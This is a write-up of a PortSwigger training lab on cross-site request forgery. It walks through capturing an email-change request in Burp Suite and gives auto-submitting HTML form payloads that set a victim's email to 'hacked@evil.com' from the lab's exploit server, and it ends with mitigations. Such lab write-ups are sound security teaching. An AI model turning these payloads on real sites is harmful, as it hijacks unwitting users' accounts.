# 📘 PortSwigger Lab: CSRF vulnerability with no defenses

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/csrf/csrf-how-to-construct-a-csrf-attack/csrf/lab-no-defenses
> 🎯 Topic: Cross-Site Request Forgery (CSRF) — basic exploitation without defenses
> 🧪 Difficulty: Apprentice
> ✅ Status: Solved
> 🛠 Tools: Burp Suite (Proxy, Repeater), Exploit Server

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🗺 Attack Scheme](#attack-scheme)
- [🔍 Step 1 — Recon the Email Change Request](#step1)
- [🔍 Step 2 — Generate CSRF Payload](#step2)
- [🔍 Step 3 — Host on Exploit Server](#step3)
- [🔍 Step 4 — Verify and Deliver to Victim](#step4)
- [📨 Example Requests & Code](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

The email change functionality is vulnerable to CSRF. The task:

```text
1. Craft HTML that automatically submits an email change request.
2. Upload it to the Exploit Server.
3. Deliver it to the victim so their email is changed.
```

> **Own-account credentials:** `wiener:peter`.

---

<a id="theory"></a>

## 🧠 Short Theory

CSRF (Cross-Site Request Forgery) is an attack where an attacker forces a victim's browser to perform an unwanted action on a site where the victim is already authenticated.

The vulnerability occurs when the server does not verify that the request came from a trusted source (e.g., no CSRF token or no `Referer`/`Origin` check). If the browser automatically attaches session cookies to the request, the server treats it as legitimate.

---

<a id="idea"></a>

## 🧩 Core Idea

1. **No defenses:** The server accepts a POST request to change email without a CSRF token.
2. **Auto-submit:** An HTML form with JavaScript (`document.forms[0].submit()`) submits immediately upon page load.
3. **Victim's cookies:** The victim's browser automatically attaches their session cookies to the request because the domain matches.

---

<a id="attack-scheme"></a>

## 🗺 Attack Scheme

```text
1. Recon:     Intercept legitimate POST /my-account/change-email.
2. Payload:   Create HTML form with auto-submit.
3. Host:      Upload HTML to Exploit Server.
4. Deliver:   Send link to victim (Deliver to victim).
5. Result:    Victim's email changed to the one in the form.
```

---

<a id="step1"></a>

## 🔍 Step 1 — Recon the Email Change Request

1. Log in as `wiener:peter`.
2. In Burp Suite, go to **Proxy > HTTP history**.
3. Find the `POST /my-account/change-email` request.
4. Send it to Repeater and inspect the body. It usually looks like: `email=test@test.com`.

---

<a id="step2"></a>

## 🔍 Step 2 — Generate CSRF Payload

**Option A (Burp Suite Professional):**
1. In Repeater, right-click the request.
2. Select **Engagement tools > Generate CSRF PoC**.
3. Enable **Include auto-submit script** and click **Regenerate**.
4. Copy the generated HTML.

**Option B (Burp Suite Community Edition):**
Use the following HTML template:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

* Replace `YOUR-LAB-ID` with your lab ID.
* Replace `attacker@evil.com` with any email you want to set (use your own for testing, then change it).

---

<a id="step3"></a>

## 🔍 Step 3 — Host on Exploit Server

1. Go to the **Exploit Server** tab (button at the top of the lab page).
2. Paste your HTML code into the **Body** field.
3. Click **Store**.

---

<a id="step4"></a>

## 🔍 Step 4 — Verify and Deliver to Victim

1. Click **View exploit** to test on yourself. Check HTTP history to confirm the request succeeded and the email changed.
2. **Important:** change the email in the payload to a different one (not your current one) to avoid locking yourself out.
3. Click **Deliver to victim**. The lab is solved.

---

<a id="requests"></a>

## 📨 Example Requests & Code

### Legitimate Request (for analysis)

```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com
```

### CSRF Payload (HTML)

```html
<html>
    <body>
        <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="hacked@evil.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

---

<a id="response"></a>

## 📥 Example Result

After delivery, the victim's email is changed to `hacked@evil.com` on their next visit. The lab is marked as **Solved**.

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Login wiener:peter → analyze POST /change-email.
2. Create HTML with form and auto-submit.
3. Upload HTML to Exploit Server (Store).
4. Test on yourself (View exploit).
5. Change email in payload.
6. Deliver to victim → Solved.
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

1. **No CSRF token:** Server does not check for a unique token in the request.
2. **No Origin/Referer check:** Server does not verify the request source domain.
3. **Automatic cookie inclusion:** Victim's browser attaches session cookies because the domain matches.
4. **No SameSite:** Cookies are sent on cross-site requests (in this case).

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

```text
1. Look for state-changing actions: Email change, password change, money transfer.
2. Check for tokens: Is there a hidden token field? Does it change?
3. Check headers: Is there Origin or Referer validation?
4. Create a PoC: Use Burp (Generate CSRF PoC) or write HTML manually.
5. Test on yourself: Always verify the payload on your own session before delivering to the victim.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

* **Wrong URL:** Ensure the `action` attribute points to the correct lab domain.
* **Missing auto-submit:** Without JavaScript, the form won't submit automatically (victim would have to click).
* **Not changing email:** If you send the same email, you might not notice the change or lock your account.
* **Not clicking Store:** Without saving on the Exploit Server, the payload won't be accessible.

---

<a id="defense"></a>

## 🛡 Mitigation

1. **CSRF tokens:** Unique, unpredictable token per session/form.
2. **Origin/Referer check:** Reject requests from other domains.
3. **SameSite attribute:** Set `SameSite=Lax` or `Strict` for session cookies.
4. **Re-authentication:** Require password for critical actions.

---

<a id="checklist"></a>

## ✅ Checklist

- [ ] Found `POST /my-account/change-email`
- [ ] Created HTML payload with form and auto-submit
- [ ] Uploaded payload to Exploit Server (Store)
- [ ] Tested on yourself (View exploit)
- [ ] Changed email to a different one
- [ ] Clicked Deliver to victim
- [ ] Status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved via a basic CSRF attack. We exploited the lack of CSRF tokens and automatic form submission to change the victim's email. Key lesson: state-changing actions must be protected with tokens and source validation.

---

[⬆ Back to top](#top)
